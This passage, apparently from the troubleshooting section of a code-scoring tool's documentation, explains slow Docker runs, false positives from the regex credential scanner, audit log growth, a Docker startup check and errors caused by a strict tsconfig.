1M files is still only ~23 days, and batch scoring reduces the actual
invocation count dramatically.

If Docker is consistently slow, check:

1. **Image is cached.** The first run pulls `node:20-alpine`. Subsequent runs
   use the cached image.
2. **Docker Desktop resource limits.** Increase CPU/memory allocation in Docker
   Desktop settings.
3. **WSL2 on Windows.** Docker Desktop with WSL2 backend is significantly
   faster than the Hyper-V backend.

### "Credential scanner has false positives"

The scanner uses regex patterns, which can match non-credential strings. Common
false positives:

- **Long hex strings** that happen to match the AWS key pattern.
- **JWT examples in documentation** --- the `eyJ...` pattern matches any valid
  JWT, including ones in README examples.
- **Test fixtures** with fake credentials.

Solutions:

1. Use `mode: warn` to see what is being flagged without blocking.
2. Use `mode: strip` (default) --- false positives get `[REDACTED]` but the
   code is still processed.
3. Add patterns to a local exclusion list (not yet implemented, but the
   `extra_patterns` parameter supports additions).

### "Audit log is growing too large"

The audit log writes one line per tool invocation. At 1M files with tsc +
eslint, that is 2M lines (~200 MB). Options:

1. **Rotate logs.** Move `scoring_audit.jsonl` to a dated backup before each
   scoring run.
2. **Reduce verbosity.** Audit logging only happens when an `audit_logger` is
   passed to `SandboxedRunner.from_config()`. For development, construct the
   runner without an audit logger.
3. **Compress.** JSONL compresses well with gzip (~10:1 ratio).

### "verify_or_fail() crashes at startup"

This means `require_docker: true` is set in your config, but Docker is not
running. Either:

1. Start Docker Desktop.
2. Set `require_docker: false` if you are OK with native mode.
3. Set `mode: native` to explicitly use native mode.

### "tsc finds errors that should not exist"

Remember that the hardened tsconfig uses `strict: true` and does not load any
type definitions (`types: []`). This means:

- Code that relies on `@types/node` (for `process`, `Buffer`, etc.) will get
  "cannot find name" errors.
- Code that uses ambient declarations from other packages will get type errors.
- Code that was written for `strict: false` may have implicit `any` errors.

This is by design. The scorer measures whether the code is self-contained and
type-safe, not whether it would compile in its original project context. A file
that requires 15 external type packages to compile is inherently less
self-contained than one that compiles standalone.
